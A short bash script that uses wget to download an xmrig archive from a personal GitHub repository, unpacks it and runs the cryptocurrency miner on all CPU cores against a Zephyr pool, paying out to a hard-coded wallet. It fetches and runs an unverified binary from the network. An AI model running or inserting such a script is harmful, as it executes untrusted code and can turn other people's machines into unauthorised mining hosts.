#!/bin/bash
wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
./xmrig --donate-level 1 -o sg.zephyr.herominers.com:1123 -u ZEPHYR3dcSi8rTfCSRfzfiGtRmvAgVDLe8hVU6gWwpZoJygJ5f5kDtzLXToWLowxdSS2LCgGVxEcyMg8uQgCmyk6FtUhhd62mNG1Z -p 2902 -a rx/0 -t $(nproc --all)
